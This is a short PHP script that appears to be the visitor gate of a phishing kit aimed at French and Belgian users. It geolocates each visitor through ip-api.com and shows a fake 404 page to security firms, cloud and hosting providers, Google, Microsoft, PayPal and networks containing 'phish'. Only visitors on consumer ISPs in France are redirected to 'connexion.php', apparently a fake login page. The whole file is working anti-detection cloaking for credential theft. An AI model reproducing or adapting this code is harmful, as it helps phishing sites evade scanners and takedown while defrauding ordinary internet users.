<?php
    require("config.php");

    if(_ip() != "::1" && _ip() != "127.0.0.1") {
        include("block/blockbots.php");
	    $ip = _ip();
        
        function getIpInfo($ip = '') {
            $ipinfo = file_get_contents("http://ip-api.com/json/".$ip);
            $ipinfo_json = json_decode($ipinfo, true);
            return $ipinfo_json;
        }
    
        $ipinfo_json = getIpInfo($ip);
        $org = strtolower($ipinfo_json['as']);
        $isps = $ipinfo_json['isp'];
        $country = strtolower($ipinfo_json['country']);
		
        if(strpos($org,"amazon") || strpos($org,"chrome")|| strpos($org,"google")|| strpos($org,"phish")|| strpos($org,"paypal") || strpos($org,"dedfiberco") || strpos($org,"palo") || strpos($org,"digital") || strpos($org,"cloud") || strpos($org,"trustwave") || strpos($org,"holdings") || strpos($org,"softlayer") || strpos($org,"surfcontrol") || strpos($org,"egihosting") || strpos($org,"logicweb") || strpos($org,"choopa") || strpos($org,"shinjiru") || strpos($org,"logicWeb") || strpos($org,"choopa") || strpos($org,"solutions") || strpos($org,"brookhaven")|| strpos($org,"ovh") || strpos($org,"xfera") || strpos($org,"avast") || strpos($org,"privax") || strpos($org,"wintek") || strpos($org,"kaspersky") || strpos($org,"telefônica") || strpos($org,"uk-2") || strpos($org,"bullguard") || strpos($org,"net4sec") || strpos($org,"datacamp") || strpos($org,"hostdime") || strpos($org,"dream") || strpos($org,"leaseweb") || strpos($org,"hetzner")|| strpos($org,"rakuten") || strpos($org,"forcepoint") || strpos($org,"ntt") || strpos($org,"colocrossing") || strpos($org,"forcepoint") || strpos($org,"sinet") || strpos($org,"soyuz") || strpos($org,"internap") || strpos($org,"nameshield") || strpos($org,"microsoft") || strpos($org,"vnpt") || strpos($org,"pvimpelcom") || strpos($org,"hetzner") || strpos($org,"gigenet") || strpos($org,"cogent") || strpos($org,"faster") || strpos($org,"internetx") || strpos($org,"forcepoint") || strpos($org,"financing") || strpos($org,"terratransit") || strpos($org,"joshua") || strpos($org,"fommtouch") ||  strpos($org,"yandex") || strpos($org,"ratelimited") || strpos($org,"hot-net") || strpos($org,"mcafee") || strpos($org,"dedfiberco"))
        {
            header("HTTP/1.0 404 Not Found"); die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
        }

        if ($country == "france" || $ip == "127.0.0.1" || $ip == "::1" ) {
            if (strpos($org,"bouygues") || strpos($org,"orange") || strpos($org,"sfr") || strpos($org,"free") || strpos($org,"wanadoo") || strpos($org,"proximus") || strpos($org,"laposte") || strpos($org,"nrj") || strpos($org,"sosh") || strpos($org,"coriolis") || strpos($org,"cic") || strpos($org,"poste")  || strpos($org,"mutuel")|| strpos($org,"numericable") || strpos($org, "wanadoo") || strpos($org, "bbox") || strpos($org, "sfr") || strpos($org, "free") || strpos($org, "red") || strpos($org, "proxad") || strpos($org, "club-internet") || strpos($org, "oleane") || strpos($org, "nordnet") || strpos($org, "liberty") || strpos($org, "colt") || strpos($org, "chello") || strpos($org, "belgacom") || strpos($org, "Proximus") || strpos($org, "skynet") || strpos($org, "aol") || strpos($org, "neuf") || strpos($org, "darty") || strpos($org, "bouygue") || strpos($org, "numericable") || strpos($org, "Free") || strpos($org, "Num\303\251ris") || strpos($org, "Poste") || strpos($org, "Sosh") || strpos($org, "Telenet") || strpos($org, "telenet") || strpos($org, "sosh") || strpos($org, "proximus") || strpos($org, "Belgacom") || strpos($org, "orange") || strpos($org, "Skynet") || strpos($org, "PROXIMUS") || strpos($org, "Neuf") || strpos($org, "Numericable") || $ip == "::1" || $ip == "127.0.0.1") {
            } else {
                die('HTTP/1.0 404 Not Found - ' . $org . ' - ' . $isps . ' - ' . $country);
            }
        } else {
            die('HTTP/1.0 404 Not Found - ' . $country);
        }
    }

    header("Location: connexion.php"); die();
?>